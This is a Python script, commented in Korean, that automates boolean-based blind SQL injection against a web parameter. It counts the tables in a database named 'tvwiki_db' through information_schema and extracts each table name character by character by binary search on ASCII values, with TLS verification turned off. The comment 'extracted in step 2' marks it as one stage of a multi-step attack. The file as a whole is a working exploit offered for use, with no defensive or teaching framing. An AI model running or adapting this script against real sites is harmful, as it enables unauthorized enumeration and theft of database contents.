import requests

URL = ""
PARAM = ""
TRUE_INDICATOR = ""

def send_payload(payload):
    r = requests.get(URL, params={PARAM: payload}, verify=False)
    return r.text

def is_true(payload):
    html = send_payload(payload)
    return TRUE_INDICATOR in html

def get_table_count(db_name, max_count=100):
    """DB 안에 테이블 개수 세기"""
    for i in range(1, max_count+1):
        payload = f"x' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}')={i}-- -"
        if is_true(payload):
            return i
    return None

def get_table_name(db_name, index=0, max_len=30):
    """index번째 테이블 이름 추출 (Binary Search)"""
    table_name = ""
    for i in range(1, max_len+1):
        low, high = 32, 126
        ascii_val = None
        while low <= high:
            mid = (low + high) // 2
            payload = (
                f"x' OR ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema='{db_name}' LIMIT {index},1),{i},1))>{mid}-- -"
            )
            if is_true(payload):
                low = mid + 1
            else:
                payload = (
                    f"x' OR ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables "
                    f"WHERE table_schema='{db_name}' LIMIT {index},1),{i},1))={mid}-- -"
                )
                if is_true(payload):
                    ascii_val = mid
                    break
                high = mid - 1

        if ascii_val:
            table_name += chr(ascii_val)
        else:
            break
    return table_name

if __name__ == "__main__":
    db_name = "tvwiki_db"  # 2단계에서 추출한 DB 이름

    print("[*] 테이블 개수 확인 중...")
    table_count = get_table_count(db_name)
    print(f"[+] 총 테이블 개수: {table_count}")

    print("[*] 테이블명 추출 중...")
    tables = []
    for idx in range(table_count):
        tname = get_table_name(db_name, index=idx)
        if tname:
            tables.append(tname)
            print(f"[{idx+1}/{table_count}] {tname}")
        else:
            break

    print("\n=== 최종 결과 ===")
    for i, t in enumerate(tables, start=1):
        print(f"{i}. {t}")
    print(f"\n총 {len(tables)} 개의 테이블 발견")
